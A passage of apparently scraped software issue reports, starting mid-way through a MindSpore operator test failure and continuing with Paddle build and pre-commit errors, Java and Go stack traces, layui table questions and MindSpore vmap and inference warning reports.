_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/resizenearestneighborv2_ops.py:71: in forward_cmp allclose_nparray(out_exp, out_pre, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[-1.0199e-01, -3.3594e-01, -1.1934e+00, ..., 1.8359e+00, -3.4253e-01, -3.0762e-01], [-1.0... [-4.3481e-01, 7.5537e-01, -3.6670e-01, ..., 1.0859e+00, -2.9150e-01, 8.1787e-01]]]], dtype=float16) data_me = array([[[[-1.0199e-01, -1.8896e+00, -7.8955e-01, ..., 3.2202e-01, -1.9033e+00, 4.5532e-01], [-3.3... [ 0.0000e+00, 0.0000e+00, 0.0000e+00, ..., nan, 0.0000e+00, nan]]]], dtype=float16) rtol = 0.001, atol = 0.001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[-0.336 -1.193 0.3406 ... 0.812 0.4749 -0.2915] E data_me_error:[-1.89 -0.7896 -2.086 ... 0. 0. 0. ] E loss:[1.554 0.4038 2.426 ... 0.812 0.4749 0.2915] def test_resizenearestneighborv2_input_dtype_float64_4d(): input_list = [] x0 = Tensor(np.random.randn(2, 9, 8, 1).astype(np.float64)) input_list.append(x0) x1 = Tensor(np.random.randint(1, 100, size=2).astype(np.int32)) input_list.append(x1) attributes = {'align_corners': True, 'half_pixel_centers': False, 'data_format': 'NCHW'} fact = ResizeNearestNeighborV2Mock(attributes=attributes, inputs=input_list) &gt; fact.forward_cmp() test_resizenearestneighborv2.py:282: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/resizenearestneighborv2_ops.py:71: in forward_cmp allclose_nparray(out_exp, out_pre, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[-8.44274115e-01], [ 2.76074393e-01], [-1.56502388e+00], [-1.45764986e-01], ...01], [-6.71757577e-01], [-2.47915824e-01], [ 2.16338774e-02], [-4.92668066e-01]]]]) data_me = array([[[[-8.44274115e-001, -5.71758295e-001, -1.79204727e+000, ..., -4.15307983e-001, -1.14687337e+000, -8.... nan, -3.75474568e+232, nan, ..., nan, -2.16728634e+193, 2.03705050e-312]]]]) rtol = 1e-05, atol = 1e-05 def _count_unequal_element(data_expected, data_me, rtol, atol): &gt; assert data_expected.shape == data_me.shape E AssertionError def test_resize_nearest_neighbor_v2_size_type_not_int32(): input_list = [] x0 = Tensor(np.random.randint(-100, 100, size=(10, 8, 6, 1)).astype(np.int32)) input_list.append(x0) x1 = Tensor(np.random.randint(1, 100, size=2).astype(np.int64)) input_list.append(x1) attributes = {'align_corners': True, 'half_pixel_centers': False, 'data_format': 'NHWC'} fact = ResizeNearestNeighborV2Mock(attributes=attributes, inputs=input_list) with pytest.raises(TypeError): fact.forward_mindspore_impl()"
pre-commit fails,"When I use to , there are mistakes like:   <code>: pre-commit git commit [luotao02: Paddle] var -&gt; $ git commit An error has occurred: InvalidConfigError: Invalid content: .pre-commit-config.yaml {'repos': [{'repo': 'https://github.com/Lucas-C/pre-commit-hooks.git', 'sha': 'v1.0.1', 'hooks': [{'files': '(?!.*third_party)^.*$ | (?!.*book)^.*$', 'id': 'remove-crlf'}]}, {'repo': 'https://github.com/PaddlePaddle/mirrors-yapf.git', 'sha': '0d79c0c469bab64f7229c9aca2b1186ef47f0e37', 'hooks': [{'files': '(.*\\.(py|bzl)|BUILD|.*\\.BUILD|WORKSPACE)$', 'id': 'yapf'}]}, {'repo': 'https://github.com/pre-commit/pre-commit-hooks', 'sha': '5bf6c09bfa1297d3692cadd621ef95f1284e33c0', 'hooks': [{'id': 'check-added-large-files'}, {'id': 'check-merge-conflict'}, {'id': 'check-symlinks'}, {'files': '(?!.*third_party)^.*$ | (?!.*book)^.*$', 'id': 'detect-private-key'}, {'id': 'end-of-file-fixer'}]}, {'repo': 'local', 'hooks': [{'files': '\\.(c|cc|cxx|cpp|cu|h|hpp|hxx|proto)$', 'description': 'Format files with ClangFormat.', 'language': 'system', 'entry': 'bash ./.clang_format.hook -i', 'id': 'clang-format-with-version-check', 'name': 'clang-format'}]}, {'repo': 'local', 'hooks': [{'files': '\\.(c|cc|cxx|cpp|cu|h|hpp|hxx)$', 'description': 'Check C++ code style using cpplint.py.', 'language': 'system', 'entry': 'bash ./tools/codestyle/cpplint_pre_commit.hook', 'id': 'cpplint-cpp-source', 'name': 'cpplint'}]}, {'repo': 'https://github.com/PaddlePaddle/pre-commit-golang', 'sha': '8337620115c25ff8333f1b1a493bd031049bd7c0', 'hooks': [{'id': 'go-fmt', 'types': ['go']}]}, {'repo': 'local', 'hooks': [{'files': '\\.(c|cc|cxx|cpp|cu|h|hpp|hxx|proto|py)$', 'name': 'copyright_checker', 'language': 'system', 'entry': 'python ./.copyright.hook', 'exclude': '(?!.*third_party)^.*$ | (?!.*book)^.*$', 'id': 'copyright_checker'}]}]} is not of type u'array'"
数据导入导出功能的问题,系统搭建起来了，子系统也会建了，但是对数据进行导入导出报错：   <code>: 496696 [http-nio-8080-exec-3] ERROR org.apache.catalina.core.ContainerBase.[Tomcat].[localhost].[/].[dispatcherServlet] log 175 - Servlet.service() for servlet [dispatcherServlet] in context with path [] threw exception [Request processing failed; nested exception is com.ibeetl.admin.core.util.PlatformException: 模板资源不存在：excelTemplates/jyy/jyy/你的excel模板文件名字.xls] with root cause com.ibeetl.admin.core.util.PlatformException: 模板资源不存在：excelTemplates/jyy/jyy/你的excel模板文件名字.xls at com.corp.xxx.web.TLxlTestController.export(TLxlTestController.java:180) at com.corp.xxx.web.TLxlTestController$$FastClassBySpringCGLIB$$4c98ec1.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:779) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:89) at com.ibeetl.admin.core.conf.RbacAnnotationConfig.functionAccessCheck(RbacAnnotationConfig.java:63) at sun.reflect.GeneratedMethodAccessor106.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:634) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:624) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:72) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:97) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:692) at com.corp.xxx.web.TLxlTestController$$EnhancerBySpringCGLIB$$63821297.export(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1063) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:681) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:764) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:228) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:163) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:190) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:163) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:190) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:163) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:190) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:163) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:190) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:163) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:357) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:382) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:893) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1723) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748)
插件引入第三方jar打包，运行失败,maven 配置   <code>: &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-assembly-plugin&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt; &lt;executions&gt; &lt;execution&gt; &lt;id&gt;make-assembly&lt;/id&gt; &lt;phase&gt;package&lt;/phase&gt; &lt;goals&gt; &lt;goal&gt;single&lt;/goal&gt; &lt;/goals&gt; &lt;configuration&gt; &lt;descriptorRefs&gt; &lt;descriptorRef&gt;jar-with-dependencies&lt;/descriptorRef&gt; &lt;/descriptorRefs&gt; &lt;/configuration&gt; &lt;/execution&gt; &lt;/executions&gt; &lt;/plugin&gt;
Can't find `boost/config.hpp`.,"It occurs frequently:   <code>: [16:34:13] In file included from /paddle/paddle/fluid/framework/type_defs.h:23:0, [16:34:13] from /paddle/paddle/fluid/framework/attribute.h:24, [16:34:13] from /paddle/paddle/fluid/framework/op_desc.h:19, [16:34:13] from /paddle/paddle/fluid/framework/block_desc.h:23, [16:34:13] from /paddle/paddle/fluid/platform/device_tracer.cc:23: [16:34:13] /paddle/paddle/fluid/platform/variant.h:30:28: fatal error: boost/config.hpp: No such file or directory [16:34:13] compilation terminated. [16:34:13] paddle/fluid/platform/CMakeFiles/device_tracer.dir/build.make:62: recipe for target 'paddle/fluid/platform/CMakeFiles/device_tracer.dir/device_tracer.cc.o' failed [16:34:13] CMakeFiles/Makefile2:3365: recipe for target 'paddle/fluid/platform/CMakeFiles/device_tracer.dir/all' failed [16:34:13] make[2]: *** [paddle/fluid/platform/CMakeFiles/device_tracer.dir/device_tracer.cc.o] Error 1 [16:34:13] make[1]: *** [paddle/fluid/platform/CMakeFiles/device_tracer.dir/all] Error 2 [16:34:13] make[1]: *** Waiting for unfinished jobs...."
gconv struct 转换疑问,"代码如下： gf版本：v1.3.0 go版本：1.11 疑问： 不知道这样的用法能否支持？还是说我这样操作有问题，应该怎么搞呢？灰常感谢！   <code>: package main import ( ""fmt"" ""gitee.com/johng/gf/g"" ""gitee.com/johng/gf/g/util/gconv"" ) func main() { type Score struct { Name string Result int } type User struct { Scores []*Score } user := new(User) scores := map[string]interface{}{ ""Scores"" : map[string]interface{}{ ""Name"" : ""john"", ""Result"" : 100, }, } // 嵌套struct转换，属性为slice类型，数值为map类型 if err := gconv.Struct(scores, user); err != nil { fmt.Println(err) } else { g.Dump(user) } } panic: reflect.Set: value of type map[string]interface {} is not assignable to type []*main.Score [recovered] panic: not struct goroutine 1 [running]: gitee.com/johng/gf/third/github.com/fatih/structs.strctVal(0x153a5a0, 0x0, 0x0, 0x3, 0xc0000e0b90) /Users/go/pkg/mod/gitee.com/johng/gf@v1.3.0/third/github.com/fatih/structs/structs.go:437 +0x12f gitee.com/johng/gf/third/github.com/fatih/structs.New(0x153a5a0, 0x0, 0x153a5a0) /Users/go/pkg/mod/gitee.com/johng/gf@v1.3.0/third/github.com/fatih/structs/structs.go:30 +0x39 gitee.com/johng/gf/third/github.com/fatih/structs.Fields(0x153a5a0, 0x0, 0x196, 0x153a5a0, 0x0) /Users/go/pkg/mod/gitee.com/johng/gf@v1.3.0/third/github.com/fatih/structs/structs.go:464 +0x35 gitee.com/johng/gf/g/util/gconv.getTagMapOfStruct(0x1617f20, 0xc0000bb1e0, 0x20) /Users/go/pkg/mod/gitee.com/johng/gf@v1.3.0/g/util/gconv/gconv_struct.go:140 +0x99 gitee.com/johng/gf/g/util/gconv.Struct(0x1576520, 0xc0001a92f0, 0x1617f20, 0xc0000bb1e0, 0x0, 0x0, 0x0, 0x0, 0xc0000e1550) /Users/go/pkg/mod/gitee.com/johng/gf@v1.3.0/g/util/gconv/gconv_struct.go:74 +0x1db gitee.com/johng/gf/g/util/gconv.bindVarToStructIfDefaultConvertionFailed(0x15446e0, 0xc0000bb180, 0x197, 0x1576520, 0xc0001a92f0, 0xc000092480, 0x5a) /Users/go/pkg/mod/gitee.com/johng/gf@v1.3.0/g/util/gconv/gconv_struct.go:223 +0x603 gitee.com/johng/gf/g/util/gconv.bindVarToStruct.func1(0x15446e0, 0xc0000bb180, 0x197, 0x1576520, 0xc0001a92f0, 0xc0000e17f0) /Users/go/pkg/mod/gitee.com/johng/gf@v1.3.0/g/util/gconv/gconv_struct.go:172 +0x77 panic(0x1551c80, 0xc000167660) /usr/local/Cellar/go/1.11/libexec/src/runtime/panic.go:513 +0x1b9 reflect.Value.assignTo(0x1576520, 0xc0001a92f0, 0x15, 0x162114f, 0xb, 0x15446e0, 0x0, 0x1511bd7, 0x1511bda, 0xe) /usr/local/Cellar/go/1.11/libexec/src/reflect/value.go:2239 +0x44c reflect.Value.Set(0x15446e0, 0xc0000bb180, 0x197, 0x1576520, 0xc0001a92f0, 0x15) /usr/local/Cellar/go/1.11/libexec/src/reflect/value.go:1373 +0xa7 gitee.com/johng/gf/g/util/gconv.bindVarToStruct(0x1596e20, 0xc0000bb180, 0x199, 0x14ffd13, 0x6, 0x1576520, 0xc0001a92f0, 0x0, 0x0) /Users/go/pkg/mod/gitee.com/johng/gf@v1.3.0/g/util/gconv/gconv_struct.go:175 +0x21e gitee.com/johng/gf/g/util/gconv.Struct(0x1576520, 0xc0001a9320, 0x153a5e0, 0xc0000bb180, 0x0, 0x0, 0x0, 0x10072c0, 0xc000092058) /Users/go/pkg/mod/gitee.com/johng/gf@v1.3.0/g/util/gconv/gconv_struct.go:127 +0x8f3 main.main() /Users/go/src/testgf/main.go:27 +0x195"
关于Tensor索引的建议和文档的建议,"建议添加整形数组或布尔数组索引，就如同numpy和pytorch那样！！！！ 例如在pytorch中，可以写出很简短的代码： 而翻译成paddle，却 建议加速paddle官网文档的更新，我看咱源码函数头部里面的注释本身就很清楚，详细了！可以先导出，先用着，现在我都得在github的paddle代码中找API。   <code>: target_classes_o = torch.cat([t[""labels""][J] for t, (_, J) in zip(targets, indices)]) # [batch_size, num_objects] target_classes_o = [t[""labels""].numpy()[J.numpy()] for t, (_, J) in zip(targets, indices)] target_classes_o = [dg.to_variable(t) for t in target_classes_o] target_classes_o = L.concat(target_classes_o) # [bs, num_object]"
table 分页后 table.checkStatus 只能获取当前页的数据？,我的数据比较多，使用 table 进行了分页操作，每页 50 行。 分页之后通过 获取选中的行，发现只能获取当前页的，不能获取全部页的。 有没有什么办法可以获取全部页的选中行呢？   <code>: table.checkStatus
[MKL-DNN] Clean up group conv transpose implementation in  conv_transpose_mkldnn_op.cc,"The with could not pass python UT. Because there are no models using the till now, it was not tested. As disscussed with @jczaja the original implementation is done in 2017 and back then there is no mkldnn reorder provided. Now mkldnn support the reorder and group conv transpose. We should find time to rewrite this part. As there is no models using it, it is not that urgent. Just the UT test could not cover those parts with   <code>: conv transpose groups&gt;1 group conv transpose groups&gt;1"
冻结列在页面缩放后会出现变形,如图所示，必须重新刷新页面后才行 在initFixedColumns内添加如下两行后有改善 但跨页选择就会出现问题：除非刷新页面，否则跨页选择的内容不会取消   <code>: $($.find('.left-fixed-table-columns')).remove(); $($.find('.left-fixed-body-columns')).remove();
[ST][MS][CI][yolov3_darknet53][ascend310]too much warnings on 310 infer ,"yolov3_darknet53 在310环境warning打印24条 / 硬件环境: /device ascend310 : -- MindSpore version :commit_id = ''[sha1]:23b55602,[branch]:r1.8 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_yolov3_darknet53_coco2014_mindir_infer_0003.py 1.pytest -s test_ms_yolov3_darknet53_coco2014_mindir_infer_0003.py 2. 3. 用例执行通过，warning报错少于10条 Special notes for this issue/备注 (Optional / 选填 转给洛阳   <code>: [WARNING] MD(779,ffff90a30010,main):2022-07-01-01:33:37.733.885 [mindspore/ccsrc/minddata/dataset/kernels/image/dvpp/utils/MDAclProcess.cc:824] JPEG_DR] It's deprecated to use kCpu as input device for Dvpp operators to compute, because it's slow and unsafe, we recommend you to set input device as MapTargetDevice::kAscend for Dvpp operators. This API will be removed later [WARNING] MD(779,ffff90a30010,main):2022-07-01-01:33:37.754.633 [mindspore/ccsrc/minddata/dataset/kernels/image/dvpp/utils/MDAclProcess.cc:824] JPEG_DR] It's deprecated to use kCpu as input device for Dvpp operators to compute, because it's slow and unsafe, we recommend you to set input device as MapTargetDevice::kAscend for Dvpp operators. This API will be removed later [WARNING] MD(779,ffff90a30010,main):2022-07-01-01:33:37.775.516 [mindspore/ccsrc/minddata/dataset/kernels/image/dvpp/utils/MDAclProcess.cc:824] JPEG_DR] It's deprecated to use kCpu as input device for Dvpp operators to compute, because it's slow and unsafe, we recommend you to set input device as MapTargetDevice::kAscend for Dvpp operators. This API will be removed later [WARNING] MD(779,ffff90a30010,main):2022-07-01-01:33:37.796.382 [mindspore/ccsrc/minddata/dataset/kernels/image/dvpp/utils/MDAclProcess.cc:824] JPEG_DR] It's deprecated to use kCpu as input device for Dvpp operators to compute, because it's slow and unsafe, we recommend you to set input device as MapTargetDevice::kAscend for Dvpp operators. This API will be removed later grep ""^\[WARNING\]"" /home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/yolov3_darknet53/infer/test_ms_yolov3_darknet53_coco2014_mindir_infer_0003/scripts/infer.log |wc -l 24"
"[CT][MS][vmap]An Error Is Reported During VAMP Test Case Execution of the ApplyProximalAdagrad, unsortedsegmentsum, and UnsortedSegmentProd Operators","ApplyProximalAdagrad、unsortedsegmentsum算子在GPU后端及UnsortedSegmentProd算子在CPU后端vamp用例执行报错 / 硬件环境: /device GPU/CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_vmap_applyadamwithamsgrad_vmap128 test_vmap_applyadamwithamsgrad_vmap32 test_vmap_applyadamwithamsgrad_vmap64 test_vmap_unsorted_segment_sum_128 test_vmap_unsorted_segment_sum_16 test_vmap_unsorted_segment_sum_32 test_vmap_unsorted_segment_sum_64 test_vmap_unsorted_segment_sum_8 test_unsorted_segment_prod_vmap_128 test_unsorted_segment_prod_vmap_16 test_unsorted_segment_prod_vmap_32 test_unsorted_segment_prod_vmap_64 test_unsorted_segment_prod_vmap_8 pytest -s test_n_proximaladagrad.py pytest -s test_unsortedsegmentsum.py pytest -s test_unsortedsegmentprod.py pass   <code>: 1、 def test_vmap_applyadamwithamsgrad_vmap128(): shape = (128, 128, 3, 3) fact = ApplyProximalAdagradVmapFactory(shape=shape) net = ApplyProximalAdagradVmap() &gt; fact.forward_vmap_cmp(net=net, run_time=30, improve_times=1) ../operations/test_n_proximaladagrad.py:431: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/nn/proximaladagrad_ops.py:281: in forward_vmap_cmp Tensor(0.9), Tensor(0.9), Tensor(0.1)) ../share/meta.py:469: in vmap_cmp nest_output = nest_net_vmap(*inputs) /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:626: in __call__ out = self.compile_and_run(*args) /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:943: in compile_and_run self.compile(*inputs) /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:917: in compile jit_config_dict=self._jit_config_dict) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7fce117adc10&gt; obj = NestNetVmap&lt; (net): ApplyProximalAdagradVmap&lt;&gt; &gt; phase = 'train.1668564228772305664.140513736292112.16', do_convert = True jit_config_dict = {} args = (Tensor(shape=[], dtype=Float32, value= 0.9), Tensor(shape=[], dtype=Float32, value= 0.9), Tensor(shape=[], dtype=Float32, value= 0.1)) def compile(self, obj, *args, phase='predict', do_convert=True, jit_config_dict=None): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. jit_config_dict (dict): Jit config for compile. Default: None. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args self.enable_tuple_broaden = False if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) if jit_config_dict: self._graph_executor.set_jit_config(jit_config_dict) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E RuntimeError: ApplyProximalAdagrad does not support 'batch_rank' on GPU, which means that 'vmap' cannot support ApplyProximalAdagrad on GPU currently. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/gpu/hal/hardware/gpu_device_context.cc:604 SetOperatorInfo 2、 def test_vmap_unsorted_segment_sum_128(): fact = UnsortedSegmentSumFactory( input_shape=(128, 128, 3, 128), indices=(2, 0, 1), end=4, num_segments=3, dtype1=np.float32 ) &gt; fact.forward_vmap_cmp(6) ../operations/test_unsortedsegmentsum.py:505: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/unsortedsegmentsum_ops.py:118: in forward_vmap_cmp out_vmap0 = forward_vmap_net(x_tensor, ids_tensor) /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:555: in staging_specialize out = _MindsporeFunctionExecutor(func, hash_obj, input_signature, process_obj, jit_config)(*args) /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:97: in wrapper results = fn(*arg, **kwargs) /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:295: in __call__ phase = self.compile(args_list, self.fn.__name__) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._MindsporeFunctionExecutor object at 0x7feeb8052d90&gt; args_list = (Tensor(shape=[128, 128, 3, 128], dtype=Float32, value= [[[[ 7.92862415e-01, -3.32881480e-01, 1.14075266e-01 ... 6.5...32803e-01 ... 1.52072299e+00, 3.73343676e-01, 8.76643300e-01]]]]), Tensor(shape=[3], dtype=Int32, value= [2, 0, 1])) method_name = 'after_vmap' def compile(self, args_list, method_name): """"""Returns pipeline for the given args."""""" # Check whether hook function registered on Cell object. if self.obj and hasattr(self.obj, ""_hook_fn_registered""): if self.obj._hook_fn_registered(): logger.warning(f""For 'Cell', it's not support hook function when using 'jit' decorator. "" f""If you want to use hook function, please use context.set_context to set "" f""pynative mode and remove 'jit' decorator."") # Chose dynamic shape tensors or actual input tensors as compile args. compile_args = self._generate_compile_args(args_list) # Restore the mutable attr for every arg. compile_args = _restore_mutable_attr(args_list, compile_args) generate_name = self.fn.__module__ + ""."" + self.fn.__name__ + ""."" + self.fn.__code__.co_filename + ""."" + \ str(self.fn.__code__.co_firstlineno) + '.' + str(id(self.fn)) if _pynative_executor.grad_flag(): generate_name = generate_name + "".grad"" if _is_pynative_parallel(): generate_name = generate_name[:generate_name.rfind(str(id(self.fn)))] + str(id(self.shard_parent_obj)) # Add key with obj if self.obj is not None: if self.obj.__module__ != self.fn.__module__: logger.info(f'`obj` module not equal to `fn` module: {self.obj.__module__}, {self.fn.__module__}') self.obj.__parse_method__ = method_name if isinstance(self.obj, ms.nn.Cell): generate_name = generate_name + '.' + str(self.obj.create_time) else: generate_name = generate_name + '.' + str(self._create_time) generate_name = generate_name + '.' + str(id(self.obj)) else: # Different instance of same class may use same memory(means same 